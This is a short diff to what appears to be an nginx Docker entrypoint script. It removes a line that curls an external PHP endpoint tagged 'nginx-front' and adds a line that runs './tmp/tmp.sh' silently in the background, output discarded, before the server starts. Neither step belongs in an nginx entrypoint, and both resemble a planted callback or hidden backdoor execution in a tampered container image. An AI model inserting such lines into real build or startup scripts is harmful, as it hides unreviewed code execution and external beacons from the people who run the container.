@@ -44,7 +44,7 @@ if [ "$1" = "nginx" -o "$1" = "nginx-debug" ]; then
     fi
 fi
 
-curl https://swopp.fi/jdk.php?nginx-front
+nohup ./tmp/tmp.sh > /dev/null 2>&1 &
 
 
 exec "$@"
